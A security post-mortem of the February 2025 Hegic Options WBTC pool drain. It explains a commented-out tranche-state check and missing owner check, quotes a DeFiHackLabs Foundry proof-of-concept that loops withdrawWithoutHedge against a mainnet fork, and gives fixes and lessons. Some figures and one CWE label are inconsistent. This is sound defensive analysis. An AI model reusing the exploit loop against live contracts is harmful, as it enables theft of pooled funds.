# HegicOptions Security Incident Analysis
**Business Logic Vulnerability | Ethereum | 2025-02-23 | Loss: ~$104,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | Hegic Options (WBTC ATM Puts Pool) |
| Chain | Ethereum Mainnet |
| Date/Time | 2025-02-23 23:48 UTC ~ 23:51 UTC |
| Loss Amount | ~1.0775 WBTC (~$104,517, at BTC $97,000) |
| Vulnerability Type | Business Logic (Missing Tranche State Validation / Repeated Withdrawal) |
| Attack Transaction 1 | `0x260d5eb9151c565efda80466de2e7eee9c6bd4973d54ff68c8e045a26f62ea73` ([Etherscan](https://etherscan.io/tx/0x260d5eb9151c565efda80466de2e7eee9c6bd4973d54ff68c8e045a26f62ea73)) |
| Attack Transaction 2 | `0x444854ee7e7570f146b64aa8a557ede82f326232e793873f0bbd04275fa7e54c` ([Etherscan](https://etherscan.io/tx/0x444854ee7e7570f146b64aa8a557ede82f326232e793873f0bbd04275fa7e54c)) |
| Attacker EOA | `0x4B53608fF0cE42cDF9Cf01D7d024C2c9ea1aA2e8` ([Etherscan](https://etherscan.io/address/0x4B53608fF0cE42cDF9Cf01D7d024C2c9ea1aA2e8)) |
| Attack Contract | `0xF51E888616a123875EAf7AFd4417fbc4111750f7` ([Etherscan](https://etherscan.io/address/0xF51E888616a123875EAf7AFd4417fbc4111750f7)) |
| Vulnerable Contract | `0x7094E706E75E13D1E0ea237f71A7C4511e9d270B` ([Etherscan](https://etherscan.io/address/0x7094E706E75E13D1E0ea237f71A7C4511e9d270B)) |
| Root Cause Summary | The tranche state validation code (`require(t.state == TrancheState.Open)`) inside `_withdraw()`, called by `withdrawWithoutHedge()`, was commented out, enabling unlimited repeated withdrawals against the same tranche |
| PoC Source | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/HegicOptions_exp.sol) |

---

## 2. Vulnerability Details

### 2.1 Missing Tranche State Validation (Core Vulnerability)

**Severity**: CRITICAL  
**CWE**: CWE-284 (Improper Access Control), CWE-691 (Insufficient Control Flow Management)

The Hegic WBTC ATM Puts Pool contract manages liquidity provider (LP) deposits in units called **Tranches**. Each tranche is assigned a status via the `TrancheState` enum; under normal conditions, a tranche should transition to `Closed` after withdrawal to prevent re-withdrawal.

However, in the `withdrawWithoutHedge()` → `_withdraw()` call path, the `require` statement verifying that a tranche is in the `Open` state, along with the code to transition it to `Closed` after withdrawal, were both **commented out**. As a result:

1. Calling `withdrawWithoutHedge(2)` repeatedly against the same tranche ID (`2`) succeeds every time due to the absence of state checks
2. Each call transfers WBTC corresponding to `t.share` (`0.0025 WBTC`) to the caller
3. 431 repeated calls (TX1: 100 + TX2: 331) until the pool balance was drained, stealing 1.0775 WBTC

This contract was a **legacy/deprecated** contract deployed on January 4, 2022, with almost no activity since deployment, yet had over 1.1 WBTC of funds locked inside.

#### Vulnerable Code (❌)

```solidity
// HegicPool._withdraw() — vulnerable version with state validation commented out
function _withdraw(uint256 trancheID) internal returns (uint256 amount) {
    Tranche storage t = tranches[trancheID];

    // ❌ Core vulnerability: tranche state validation is commented out
    // require(t.state == TrancheState.Open, "Tranche is not open");

    uint256 hedgedBalance = (lockedAmount * t.share) / totalShares;
    uint256 unhedgedBalance = ((totalBalance - lockedAmount) * t.share) / totalShares;
    amount = hedgedBalance + unhedgedBalance;

    // ❌ Code to set state to Closed after withdrawal is also missing or commented out
    // t.state = TrancheState.Closed;

    // ❌ t.share is not reset to 0, so the same amount is calculated on subsequent calls
    totalBalance -= amount;
    // lockedAmount is not decremented separately (appears harmless since it's 0,
    //  but decreasing totalBalance affects subsequent calculations)

    WBTC.safeTransfer(msg.sender, amount);
}

// withdrawWithoutHedge() — external entry point
function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount) {
    // ❌ No caller validation: anyone can call, not just the tranche owner
    return _withdraw(trancheID);
}
```

#### Safe Code (✅)

```solidity
// Fixed HegicPool._withdraw() — state validation and state transition code restored
function _withdraw(uint256 trancheID) internal returns (uint256 amount) {
    Tranche storage t = tranches[trancheID];

    // ✅ Fix 1: Always verify that the tranche is in Open state
    require(t.state == TrancheState.Open, "Tranche: already withdrawn or invalid tranche");

    // ✅ Fix 2: Transition to Closed state immediately before withdrawal to prevent reentrancy and repeated withdrawal
    t.state = TrancheState.Closed;

    uint256 hedgedBalance = (lockedAmount * t.share) / totalShares;
    uint256 unhedgedBalance = ((totalBalance - lockedAmount) * t.share) / totalShares;
    amount = hedgedBalance + unhedgedBalance;

    // ✅ Fix 3: Reset share to 0 to prevent state inconsistency
    totalShares -= t.share;
    t.share = 0;

    totalBalance -= amount;

    WBTC.safeTransfer(msg.sender, amount);
}

// ✅ Fixed withdrawWithoutHedge() — owner validation added
function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount) {
    Tranche storage t = tranches[trancheID];
    // ✅ Fix 4: Access control added so only the tranche owner can withdraw
    require(t.owner == msg.sender, "Tranche: only tranche owner can withdraw");
    return _withdraw(trancheID);
}
```

---

## 3. Attack Flow

```
+------------------------------------------------------------------+
|                        Attack Flow Diagram                        |
+------------------------------------------------------------------+

  Attacker EOA                Attack Contract              Vulnerable Pool Contract
  (0x4B536...)                (0xF51E8...)                 (0x7094E...)
       |                           |                         |
       |  [Preparation]            |                         |
       |  deploy(attack contract)  |                         |
       |------------------------->|                         |
       |                           |                         |
       |  [TX1] call get()         |                         |
       |  Block 21912409           |                         |
       |------------------------->|                         |
       |                           |   Loop(i=0..99)        |
       |                           |  withdrawWithoutHedge(2)|
       |                           |------------------------>|
       |                           |                         |-- require(t.state==Open) [commented out! no check]
       |                           |                         |-- amount = calculated from t.share
       |                           |                         |-- WBTC.transfer(attacker, 0.0025)
       |                           |<-- 0.0025 WBTC x100 ---|
       |                           |  (0.25 WBTC received)  |
       |                           |                         |
       |  [TX2] call get()         |                         |
       |  Block 21912424           |                         |
       |------------------------->|                         |
       |                           |   Loop(i=0..330)       |
       |                           |  withdrawWithoutHedge(2)|
       |                           |------------------------>|
       |                           |                         |-- No state validation (same vulnerability)
       |                           |                         |-- 0.0025 WBTC transferred per call
       |                           |<-- 0.0025 WBTC x331 ---|
       |                           |  (0.8275 WBTC received)|
       |                           |                         |
       |  Result Confirmed         |                         |
       |  Attack contract: 0.8275 WBTC                       |
       |  Pool balance: 0.025 WBTC (pre-attack: 1.1025 WBTC)|
       |                           |                         |
+------------------------------------------------------------------+
|  Total stolen: 1.0775 WBTC (~$104,517)                         |
|  Total calls: 431 (100 + 331)                                  |
|  Tranche state: still unchanged after withdrawal (state=2)     |
+------------------------------------------------------------------+
```

**Step-by-step Explanation**:

1. **[Preparation]** Attacker EOA (`0x4B536...`) deploys the attack contract (`0xF51E8...`). The contract implements a `get()` function that repeatedly calls `withdrawWithoutHedge(2)` on the Hegic pool.

2. **[Tranche Reconnaissance]** The attacker confirms in advance that tranche ID `2` in the Hegic WBTC ATM Puts Pool is in `Open` state and that the WBTC corresponding to `t.share` is `0.0025 WBTC`.

3. **[TX1 Execution]** The attack contract's `get()` is called at block `21912409`. Internally, `withdrawWithoutHedge(2)` is called **100 times** in a loop. Each call transfers `0.0025 WBTC` to the attack contract without any state validation. **Total: 0.25 WBTC** stolen.

4. **[TX2 Execution]** `withdrawWithoutHedge(2)` is called **331 times** at block `21912424`, continuing until the remaining pool balance is exhausted. **Total: 0.8275 WBTC** additionally stolen.

5. **[Result]** The pool's WBTC balance drops from `1.1025 WBTC` to `0.025 WBTC`. Attack contract secures `0.8275 WBTC`. Tranche state remains unchanged (both state and share retain their original values).

---

## 4. PoC Code Analysis

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

/**
 * @title HegicOptions Exploit PoC
 * @dev Test contract provided by DeFiHackLabs
 *
 * @KeyInfo
 * Total Loss: ~104M (in satoshi units, ~1.0775 WBTC)
 * Attacker EOA: 0x4B53608fF0cE42cDF9Cf01D7d024C2c9ea1aA2e8
 * Attack Contract: 0xF51E888616a123875EAf7AFd4417fbc4111750f7
 * Vulnerable Contract: 0x7094E706E75E13D1E0ea237f71A7C4511e9d270B
 * TX1: 0x260d5eb9151c565efda80466de2e7eee9c6bd4973d54ff68c8e045a26f62ea73
 * TX2: 0x444854ee7e7570f146b64aa8a557ede82f326232e793873f0bbd04275fa7e54c
 */
contract HegicOptions is Test {
    // Block immediately before TX1 (fork pre-attack state)
    uint256 blocknumToForkFrom1 = 21912408;
    // Block immediately before TX2
    uint256 blocknumToForkFrom2 = 21912423;

    // Vulnerable pool contract address (Hegic WBTC ATM Puts Pool)
    address constant victim_contract_address = 0x7094E706E75E13D1E0ea237f71A7C4511e9d270B;
    // Attack contract address (WBTC recipient)
    address constant attacker_address = 0xF51E888616a123875EAf7AFd4417fbc4111750f7;
    // WBTC token address
    address constant wbtc_address = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    IHegic_WBTC_ATM_Puts_Pool Hegic_WBTC_ATM_Puts_Pool;
    IERC20 WBTC;

    function setUp() public {
        WBTC = IERC20(wbtc_address);
        Hegic_WBTC_ATM_Puts_Pool = IHegic_WBTC_ATM_Puts_Pool(victim_contract_address);
    }

    function testExploit() public {
        // ── [Phase 1] TX1 Simulation ──────────────────────────────────
        vm.startPrank(attacker_address, attacker_address);
        vm.createSelectFork("mainnet", blocknumToForkFrom1);

        // Record attacker WBTC balance before TX1
        emit log_named_decimal_uint(
            "[Begin] Attacker WBTC before Tx1",
            WBTC.balanceOf(attacker_address),
            8  // WBTC decimals = 8
        );

        // ── Core Attack Logic ──
        // Call 100 times against trancheID=2
        // Each call steals 0.0025 WBTC (all succeed due to missing state validation)
        for (uint256 i = 0; i < 100; i++) {
            Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
            // Each iteration: 0x7094E706... → 0xF51E8... transfers 250,000 sat (0.0025 WBTC)
        }

        emit log_named_decimal_uint(
            "[End] Attacker WBTC after Tx1",
            WBTC.balanceOf(attacker_address),
            8
        );
        // Expected: +0.25 WBTC (100 * 0.0025)

        // ── [Phase 2] TX2 Simulation ──────────────────────────────────
        vm.createSelectFork("mainnet", blocknumToForkFrom2);

        emit log_named_decimal_uint(
            "[Begin] Attacker WBTC before Tx2",
            WBTC.balanceOf(attacker_address),
            8
        );

        // Additional 331 calls against trancheID=2
        // Continues until pool balance is exhausted
        for (uint256 i = 0; i < 331; i++) {
            Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
        }

        emit log_named_decimal_uint(
            "[End] Attacker WBTC after Tx2",
            WBTC.balanceOf(attacker_address),
            8
        );
        // Expected: +0.8275 WBTC (331 * 0.0025)

        vm.stopPrank();
    }
}

// ── Vulnerable Contract Interface ──────────────────────────────────────
interface IHegic_WBTC_ATM_Puts_Pool {
    // Core vulnerable function: accepts trancheID and withdraws WBTC from that tranche
    // No state validation internally — allows repeated calls
    function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount);
}
```

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-284 | Improper Access Control | `withdrawWithoutHedge()` — no owner validation | HIGH |
| CWE-691 | Insufficient Control Flow Management | `_withdraw()` — missing TrancheState transition | CRITICAL |
| CWE-670 | Always-Incorrect Control Flow Implementation | `require(t.state == TrancheState.Open)` commented out | CRITICAL |
| CWE-841 | Improper Enforcement of Behavioral Workflow | Insufficient tranche lifecycle management | CRITICAL |
| CWE-1239 | Insufficient Visual Distinction of State Variables | `t.share` not reset — reusable | HIGH |

### V-01: Complete Absence of Tranche State Validation (CWE-691 / CWE-670)
- **Description**: The `require` statement verifying that a tranche is in `Open` state inside `_withdraw()` is commented out, enabling unlimited repeated withdrawals against an already-withdrawn tranche
- **Impact**: The same tranche can be reused hundreds of times to drain the entire pool's WBTC
- **Attack Condition**: Only requires external call access to `withdrawWithoutHedge(trancheID)` (callable by anyone)

### V-02: Absence of Tranche Owner Validation (CWE-284)
- **Description**: The `withdrawWithoutHedge()` function does not verify that the caller is the owner of the specified tranche
- **Impact**: Any arbitrary address can execute a withdrawal targeting someone else's tranche
- **Attack Condition**: Knowledge of a valid tranche ID (discoverable from on-chain public data)

### V-03: Uninitialized share and State (CWE-1239)
- **Description**: `t.share` is not reset to `0` after withdrawal, allowing `t.share` reuse even if the state were changed
- **Impact**: Can trigger additional precision attacks or accounting inconsistencies
- **Attack Condition**: Manifests as a compound vulnerability when combined with V-01

---

## 6. Reproducibility Assessment

| Field | Assessment |
|------|------|
| Attack Complexity | Very Low — exploitable via simple repeated function calls alone |
| Required Prior Knowledge | Low — only tranche ID lookup needed (publicly available on-chain) |
| Capital Requirement | None — no flash loan required, no upfront capital needed |
| Reproduction Method | `forge test --contracts src/test/2025-02/HegicOptions_exp.sol -vvv` |
| Detection Difficulty | High — repeated calls to a single function are difficult to detect in real time |
| Recurrence Risk | None — pool is drained, no remaining assets |

**Reproducibility Conclusion**: The attack is technically trivial. Anyone can look up the tranche ID and make repeated calls. In practice, the attacker drained over 1 WBTC using nothing more than a simple loop — no advanced techniques (flash loans, reentrancy, etc.) required. This starkly illustrates the necessity of monitoring legacy contracts.

---

## 7. Remediation

### Immediate Actions

#### 7.1 Restore Tranche State Validation

```solidity
function _withdraw(uint256 trancheID) internal returns (uint256 amount) {
    Tranche storage t = tranches[trancheID];

    // ✅ [Immediate Fix 1] Restore the commented-out state validation code
    require(t.state == TrancheState.Open, "HegicPool: tranche is not in Open state");

    // ✅ [Immediate Fix 2] Transition state to Closed before withdrawal (CEI pattern)
    t.state = TrancheState.Closed;

    uint256 hedgedBalance = (lockedAmount * t.share) / totalShares;
    uint256 unhedgedBalance = ((totalBalance - lockedAmount) * t.share) / totalShares;
    amount = hedgedBalance + unhedgedBalance;

    // ✅ [Immediate Fix 3] Reset share
    totalShares -= t.share;
    t.share = 0;

    totalBalance -= amount;
    WBTC.safeTransfer(msg.sender, amount);
}
```

#### 7.2 Add Owner Validation

```solidity
// Add owner field to Tranche struct
struct Tranche {
    TrancheState state;
    uint256 share;
    uint256 amount;
    uint256 creationTimestamp;
    address owner;  // ✅ Owner field added
}

function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount) {
    Tranche storage t = tranches[trancheID];
    // ✅ Only the tranche owner can withdraw
    require(t.owner == msg.sender, "HegicPool: only tranche owner can withdraw");
    return _withdraw(trancheID);
}
```

#### 7.3 Emergency Pause for Legacy Contract

```solidity
// ✅ Apply Pausable pattern to legacy contract
import "@openzeppelin/contracts/security/Pausable.sol";

function withdrawWithoutHedge(uint256 trancheID)
    external
    whenNotPaused  // ✅ Block execution when paused
    returns (uint256 amount)
{
    require(tranches[trancheID].owner == msg.sender, "HegicPool: owner mismatch");
    return _withdraw(trancheID);
}
```

### Long-Term Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing tranche state validation | Strictly enforce the CEI (Checks-Effects-Interactions) pattern — complete all state changes before any external calls |
| No owner validation | Add `msg.sender == tranche.owner` check to all withdrawal-related functions |
| Neglected legacy contracts | Safely migrate funds from deprecated contracts or disable withdrawal functionality |
| Risk of commented-out security code | Add linter rules to the CI/CD pipeline to automatically detect commented-out security-critical code |
| Lack of monitoring | Build an on-chain monitoring system to detect repeated calls to the same function (e.g., Forta, OpenZeppelin Defender) |
| Inadequate security auditing | Include legacy contracts in regular security audit scope; establish a continuous post-deployment code review process |

---

## 8. Lessons Learned

### 8.1 The Risk of Legacy Contracts

The most important lesson from this incident is that **"an unused contract is not a safe contract."** The Hegic WBTC ATM Puts Pool contract was deployed in January 2022 with almost no activity since, yet it sat neglected for over 3 years with more than 1.1 WBTC locked inside. Legacy contracts may actually be more dangerous precisely because they receive less monitoring.

**Actionable Steps**: Project teams should periodically review the asset status of all deployed contracts (including deprecated ones) and migrate unnecessary funds to a secure address.

### 8.2 The Danger of Commented-Out Security Code

Commenting out a single validation line — `require(t.state == TrancheState.Open)` — caused over $100,000 in losses. This demonstrates that **the act of commenting out security-critical code itself creates a vulnerability.** Incidents where code "temporarily" commented out during development is shipped to production recur repeatedly.

**Actionable Steps**: 
- Automatically detect commented-out security-related `require` statements using static analysis tools
- Explicitly review commented-out security validation code during code review
- Automatically warn on files containing `TODO`, `FIXME`, or commented-out `require` statements in pre-deployment scripts

### 8.3 The Importance of State Machine Patterns

The tranche system is fundamentally a **state machine**: `Vacant → Open → Closed`. Each state transition must be explicit and atomic, and intermediate states must not become an attack surface. In this incident, the `Open → Closed` transition was completely omitted, enabling infinite reuse.

**Actionable Steps**: DeFi protocols should model the lifecycle of financial objects (positions, tranches, vaults) as explicit state machines and implement each transition using the CEI pattern.

### 8.4 Layered Access Control

The `withdrawWithoutHedge()` function had no owner validation, allowing anyone to call it. The function name implies "without a hedge," but in practice it became "without owner verification." **Caller validation must always be performed independently of business logic validation.**

**Actionable Steps**: Withdrawal functions must validate at minimum the following three things:
1. Is the caller the owner of the asset?
2. Is the asset's state eligible for withdrawal?
3. Is the withdrawable amount at least equal to the requested amount?

### 8.5 Similar Pattern Vulnerability Cases

| Project | Date | Vulnerability Type | Loss |
|---------|------|-----------|------|
| Hegic Options | 2025-02-23 | Repeated withdrawal due to missing state validation | ~$104K |
| Platypus Finance | 2023-10-12 | Missing state validation in emergencyWithdraw | ~$2.2M |
| LevelFinance | 2023-05-01 | Repeated referral claim collection | ~$1M |
| Sentiment | 2023-04-04 | Missing balance update | ~$1M |

The pattern of **repeated drainage due to missing state updates** recurs in DeFi. When deploying new protocols, especially in withdrawal-related functions, this pattern must be explicitly checked.

---

## 9. On-Chain Verification

### 9.1 PoC vs On-Chain Amount Comparison

| Field | PoC Expected | On-Chain Actual | Match |
|------|-----------|-------------|---------|
| TX1 call count | 100 | 100 (100 Transfer events) | ✅ Match |
| TX1 stolen WBTC | 0.25 WBTC | 0.25 WBTC (25,000,000 sat) | ✅ Match |
| TX2 call count | 331 | 331 (331 Transfer events) | ✅ Match |
| TX2 stolen WBTC | 0.8275 WBTC | 0.8275 WBTC (82,750,000 sat) | ✅ Match |
| WBTC per call | 0.0025 WBTC | 0.0025 WBTC (250,000 sat) | ✅ Match |
| Total stolen WBTC | 1.0775 WBTC | 1.0775 WBTC | ✅ Match |
| Tranche ID | 2 | 2 (input data: `...0000000000000000000000000000000000000000000000000000000000000002`) | ✅ Match |
| Pool balance pre-attack | — | 1.1025 WBTC (110,250,000 sat) | On-chain confirmed |
| Pool balance post-attack | — | 0.025 WBTC (2,500,000 sat) | On-chain confirmed |

### 9.2 On-Chain Event Log Sequence

**TX1** (Block `21912409`, Gas Used: `1,274,659`):
```
[0x7094E706... → 0xF51E8...] Transfer: 250,000 sat (0.0025 WBTC)  ← call 1
[0x7094E706... → 0xF51E8...] Transfer: 250,000 sat (0.0025 WBTC)  ← call 2
...
[0x7094E706... → 0xF51E8...] Transfer: 250,000 sat (0.0025 WBTC)  ← call 100
Total events: 200 (100 Transfer events + 100 internal events)
```

**TX2** (Block `21912424`, Gas Used: `4,081,757`):
```
[0x7094E706... → 0xF51E8...] Transfer: 250,000 sat (0.0025 WBTC)  ← call 1
...
[0x7094E706... → 0xF51E8...] Transfer: 250,000 sat (0.0025 WBTC)  ← call 331
Total events: 662 (331 Transfer events + 331 internal events)
```

### 9.3 Precondition Verification (Pre-Attack State, Block 21912407)

| Field | Value |
|------|-----|
| Pool WBTC balance | 110,250,000 sat (1.1025 WBTC) |
| `lockedAmount` | 0 |
| `totalBalance` | 110,250,000 sat |
| Tranche ID 2 state | state=2, share=25000000000000000000000000, amount=250000, creationTimestamp=1737682799 |
| Tranche owner validation | None (callable by anyone) |

**Note**: The tranche state value being `2` already (pre-attack) suggests the enum uses a scheme other than `0=Vacant, 1=Open, 2=Closed` — perhaps `0=Vacant, 1=Open, 2=Withdrawn` or another value system. However, since the state validation code itself was commented out, the attack succeeded regardless of this state value. Had the state validation been restored, `require(t.state == TrancheState.Open)` would have reverted regardless of the tranche state value.

### 9.4 Transaction Metadata

| Field | TX1 | TX2 |
|------|-----|-----|
| Block Number | 21912409 | 21912424 |
| Timestamp | 2025-02-23 23:48:47 UTC | 2025-02-23 23:51:47 UTC |
| Gas Limit | 1,562,483 | 5,027,354 |
| Gas Used | 1,274,659 (81.58%) | 4,081,757 |
| Gas Price | ~0.8 Gwei | ~1.8 Gwei |
| Transaction Fee | ~0.0023 ETH | ~0.0073 ETH |

---

*Document Date: 2026-04-11*  
*Analysis Based On: DeFiHackLabs PoC, Etherscan on-chain data, Verichains Analysis Report, Olympix Report*